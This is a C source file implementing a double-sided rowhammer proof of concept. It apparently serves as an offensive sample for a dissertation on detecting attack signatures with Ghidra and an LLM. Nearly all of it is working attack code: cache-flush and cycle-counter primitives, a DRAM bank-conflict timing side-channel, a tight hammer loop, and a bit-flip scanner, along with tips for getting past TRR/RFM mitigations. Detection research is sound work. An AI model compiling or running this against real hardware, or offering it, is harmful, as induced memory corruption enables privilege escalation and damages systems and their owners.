/*
 * rowhammer_harness.c
 *
 * Educational rowhammer proof-of-concept for dissertation analysis.
 * This is your OFFENSIVE SAMPLE — the code you compile, then feed
 * into Ghidra, then feed the decompiled output into your local LLM.
 *
 * IMPORTANT: Run ONLY in an isolated offline VM. Never against
 * production hardware or any system you do not own. Check with your
 * supervisor before running. Ethics approval required.
 *
 * Platform: Linux x86-64
 * Compile:  gcc -O0 -o hammer rowhammer_harness.c -lm
 *           (-O0 disables optimisations so Ghidra sees the full loop)
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <x86intrin.h>    /* clflush, rdtscp */

/* ── Configuration ────────────────────────────────────────────────── */
#define BUFFER_SIZE      (256 * 1024 * 1024)   /* 256 MB allocation   */
#define HAMMER_COUNT     1000000ULL             /* row activations     */
#define BANK_THRESHOLD   300                    /* cycles → same bank  */
#define CACHE_LINE       64                     /* bytes per line      */
#define ROW_STRIDE       4096                   /* DRAM row size hint  */

/* ── Key primitive 1: cache line flush ───────────────────────────────
 * This is the instruction that makes rowhammer possible.
 * Without clflush every subsequent read hits L1 cache — DRAM is never
 * touched and no row activation occurs.
 * clflush is available in Ring 3 (unprivileged userspace).
 * THIS IS THE FIRST SIGNATURE YOUR LLM MUST RECOGNISE.
 */
static inline void cache_flush(volatile void *addr)
{
    _mm_clflush((void *)addr);
    _mm_mfence();          /* serialise: ensure flush completes */
}

/* ── Key primitive 2: CPU cycle counter ─────────────────────────────
 * rdtscp reads the hardware timestamp counter (increments each cycle).
 * Exposed to Ring 3 for performance profiling — rowhammer repurposes it
 * as a timer to detect DRAM bank conflicts via latency side-channel.
 * THIS IS THE SECOND SIGNATURE YOUR LLM MUST RECOGNISE.
 */
static inline uint64_t read_cycle_counter(void)
{
    uint32_t aux;
    _mm_lfence();                   /* prevent instruction reorder */
    uint64_t t = __rdtscp(&aux);
    _mm_lfence();
    return t;
}

/* ── Bank detection: timing side-channel ────────────────────────────
 * Same bank → DRAM bank conflict → access takes ~140 ns (~300 cycles)
 * Different banks → no conflict  → access takes ~40 ns  (~80 cycles)
 * This function measures how long it takes to access two addresses
 * after flushing them from cache. A slow result reveals a same-bank pair.
 * THIS TIMING PATTERN IS THE THIRD SIGNATURE YOUR LLM MUST RECOGNISE.
 */
static uint64_t time_pair(volatile char *a, volatile char *b)
{
    cache_flush(a);                 /* evict addr A from all cache */
    cache_flush(b);                 /* evict addr B from all cache */

    uint64_t t1 = read_cycle_counter();   /* start timer            */
    *a;                             /* force read → goes to DRAM   */
    *b;                             /* force read → goes to DRAM   */
    uint64_t t2 = read_cycle_counter();   /* stop timer             */

    return t2 - t1;                 /* cycles elapsed = DRAM latency */
}

/* ── The hammer loop ─────────────────────────────────────────────────
 * This is the core of the attack.
 * Reading aggressor_a and aggressor_b in a tight loop, flushing after
 * each read, forces DRAM row activations at ~100k/sec.
 * The electromagnetic disturbance from these activations accumulates
 * in the victim row (physically between the two aggressors).
 * After enough activations a victim bit loses its charge and flips.
 * THIS TIGHT LOOP + CLFLUSH PATTERN IS THE MAIN ATTACK SIGNATURE.
 */
static void hammer_pair(volatile char *aggressor_a,
                        volatile char *aggressor_b,
                        uint64_t      iterations)
{
    for (uint64_t i = 0; i < iterations; i++) {
        *aggressor_a;               /* activate aggressor row A    */
        *aggressor_b;               /* activate aggressor row B    */
        _mm_clflush((void *)aggressor_a);  /* evict A from cache   */
        _mm_clflush((void *)aggressor_b);  /* evict B from cache   */
    }
    _mm_mfence();                   /* wait for all ops to complete */
}

/* ── Bit flip detector ───────────────────────────────────────────────
 * After hammering, scan the buffer for bytes that changed from the
 * initial fill value. Any change is a rowhammer-induced bit flip.
 */
static int scan_for_flips(uint8_t *buf, size_t size, uint8_t expected)
{
    int count = 0;
    for (size_t i = 0; i < size; i++) {
        if (buf[i] != expected) {
            printf("  [FLIP] offset=0x%06zx expected=0x%02x got=0x%02x\n",
                   i, expected, buf[i]);
            count++;
        }
    }
    return count;
}

/* ── Main ─────────────────────────────────────────────────────────── */
int main(void)
{
    printf("=== Rowhammer educational harness ===\n\n");

    /* Step 1: Allocate a large buffer
     * MAP_POPULATE forces physical pages to be assigned immediately.
     * A large allocation (256MB) ensures we span many DRAM banks,
     * giving us many candidate address pairs to test.
     */
    uint8_t *buf = mmap(
        NULL, BUFFER_SIZE,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
        -1, 0
    );
    if (buf == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    /* Fill with 0xFF so we can detect any bit flipped to 0 */
    memset(buf, 0xFF, BUFFER_SIZE);
    printf("[*] Allocated %d MB at %p\n",
           BUFFER_SIZE >> 20, (void *)buf);

    /* Step 2: Find a same-bank pair via timing side-channel
     * We scan pairs of addresses separated by ROW_STRIDE.
     * When two addresses share a DRAM bank, accessing both
     * causes a bank conflict — measurably slower than a cross-bank pair.
     * This is the DRAM bank structure leaking through timing.
     */
    printf("[*] Scanning for same-bank pair (this may take a moment)...\n");

    volatile char *aggressor_a = NULL;
    volatile char *aggressor_b = NULL;

    for (size_t i = 0; i < BUFFER_SIZE && !aggressor_a; i += ROW_STRIDE) {
        for (size_t j = i + ROW_STRIDE * 2; j < BUFFER_SIZE; j += ROW_STRIDE) {
            volatile char *a = (volatile char *)(buf + i);
            volatile char *b = (volatile char *)(buf + j);

            /* Sample the latency a few times and take the max
             * (single measurements can be noisy)
             */
            uint64_t max_cycles = 0;
            for (int s = 0; s < 10; s++) {
                uint64_t c = time_pair(a, b);
                if (c > max_cycles) max_cycles = c;
            }

            if (max_cycles > BANK_THRESHOLD) {
                aggressor_a = a;
                aggressor_b = b;
                printf("[*] Same-bank pair found:\n");
                printf("    aggressor A: offset 0x%06zx\n", i);
                printf("    aggressor B: offset 0x%06zx\n", j);
                printf("    latency:     %lu cycles (threshold: %d)\n\n",
                       max_cycles, BANK_THRESHOLD);
                break;
            }
        }
    }

    if (!aggressor_a) {
        printf("[-] No same-bank pair found.\n");
        printf("    Possible reasons:\n");
        printf("    - Modern DDR4/DDR5 with TRR/RFM mitigation\n");
        printf("    - Threshold needs tuning for this hardware\n");
        printf("    - Try increasing BUFFER_SIZE or adjusting ROW_STRIDE\n");
        munmap(buf, BUFFER_SIZE);
        return 1;
    }

    /* Step 3: Hammer the aggressor pair
     * Repeatedly read both aggressor addresses, flushing from cache
     * between each read. This forces DRAM row activations at high rate.
     * The victim row (physically between the two aggressors) receives
     * electromagnetic disturbance from both sides simultaneously
     * (double-sided rowhammer = more effective than single-sided).
     */
    printf("[*] Hammering %llu activations (double-sided)...\n",
           (unsigned long long)HAMMER_COUNT);
    hammer_pair(aggressor_a, aggressor_b, HAMMER_COUNT);
    printf("[*] Hammering complete.\n\n");

    /* Step 4: Check for bit flips */
    printf("[*] Scanning for bit flips...\n");
    int flips = scan_for_flips(buf, BUFFER_SIZE, 0xFF);

    if (flips > 0) {
        printf("\n[+] SUCCESS: %d bit flip(s) detected.\n", flips);
        printf("    This demonstrates rowhammer works on this hardware.\n");
    } else {
        printf("[-] No bit flips detected.\n");
        printf("    Hardware mitigations (TRR/RFM) may be active.\n");
        printf("    Try: increasing HAMMER_COUNT, different BANK_THRESHOLD,\n");
        printf("         or running on older DDR3/DDR4 without mitigations.\n");
    }

    munmap(buf, BUFFER_SIZE);
    return 0;
}